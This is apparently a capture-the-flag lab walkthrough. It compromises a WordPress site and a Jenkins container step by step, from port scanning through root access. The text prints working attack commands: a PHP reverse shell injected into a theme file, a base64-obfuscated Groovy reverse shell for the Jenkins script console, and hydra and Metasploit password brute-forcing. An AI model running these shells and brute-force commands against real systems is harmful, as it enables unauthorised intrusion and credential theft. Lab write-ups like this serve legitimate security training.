i start with an nmap (a simple host discovery and port scanning tool)
	
	nmap 10.10.205.70
outpup:
	
	PORT   STATE SERVICE
	22/tcp open  ssh
	80/tcp open  http

i then visit the website on port 80 and i start a gobuster in the background:
	
	gobuster dir -u http://10.10.205.70/ -w ~/Pentest/SecLists/Discovery/Web-Content/big.txt -x php,html,txt,js,pdf -t 20
output:
	
	/index.html           (Status: 200) [Size: 10918]
	/javascript           (Status: 301) [Size: 317] [--> http://10.10.205.70/javascript/]
	/phpmyadmin           (Status: 301) [Size: 317] [--> http://10.10.205.70/phpmyadmin/]
	/server-status        (Status: 403) [Size: 277]
	/wordpress            (Status: 301) [Size: 316] [--> http://10.10.205.70/wordpress/]
so i visit the url and (also from the name of the folder)
i understand that is a site hosted with wordpress.
The first thing i check is the wordpress version:
	
	WordPress version 5.4.2
so i start a wordpress scan with WPScan:
	
	wpscan -e --url http://10.10.205.70/blog/
and i find out that the username is admin
so i search an exploit for this version;
WPScan gives me advice for an exploit:
	
	https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
There is a module on msfconsole that let me exploit this
vulnerability

so i set every request nedeed and start the exploit;
eventually i got the password:
	
	admin:[REDACTED]
so i log inside the wp-login page and upload a revshell
i set up a listener on port 4444 on my local machine:
	
	python3 -m pwncat
	connect -lp 4444
then i modified the 404.php file on wordpress to upload the revshell:
	
	<?php
	exec("/bin/bash -c 'bash -i > /dev/tcp/10.8.79.118/4444 0>&1'");

so now we have access as www-data on the first container;
Now we need to pivot to the next host:
so i upload linpeas on the machine for the enumeration:
	
	Ctrl + d 
	Upload Pentest/linpeas.sh /tmp/linpeas.sh

But it finds nothing, so i keep enumerating manully;
I found something strange in the /opt directory:
	
	aubreanna:[REDACTED]

So now we can log as the aubreanna user;
In her /home directory i found a jenkins.txt file
and there is written on it that is a jenkins service running on port 8080 on the localhost
So we need to port forward the service to our machine:
On our localmachine i entered this command:
	
	ssh -L 9000:127.0.0.1:8080 aubreanna@10.10.205.70

The port 9000 on our localhost is binded on the 8080 on the remote machine
I visited the http://127.0.0.1:9000/
is a jenkins login page.
I tried a brute force on the admin user after tryng a bunch of common creds:
	
	hydra 127.0.0.1 -s 5555 -V -f http-form-post "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in&Login=Login:Invalid username or password" -l admin -P /usr/share/wordlists/rockyou.txt

i found the creds:
	
	admin:[REDACTED]

We are inside jenkins page.
We now need to place a revshell on the script console on admin page:
	
	def sout = new StringBuffer(), serr = new StringBuffer()
	def proc = 'bash -c {echo,YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44Ljc5LjExOC83Nzc3IDA+JjEn}|{base64,-d}|{bash,-i}'.execute()
	proc.consumeProcessOutput(sout, serr)
	proc.waitForOrKill(1000)
	println "out> $sout err> $serr"

I set up another listener on my machine:
	
	python3 -m pwncat
	connect -lp 7777

We are now inside jenkins container;
i tried priv-esc via linpeas.sh:
	
	Ctrl-d
	upload Pentest/linpeas.sh /tmp/linpeas.sh

i run linpeas but also this time it doesnt find anything,
so i checked once again in /opt folder and i had luck:
	
	root:[REDACTED]

I then come back to the main machine and log in as root
and GOT THE LAST FLAG


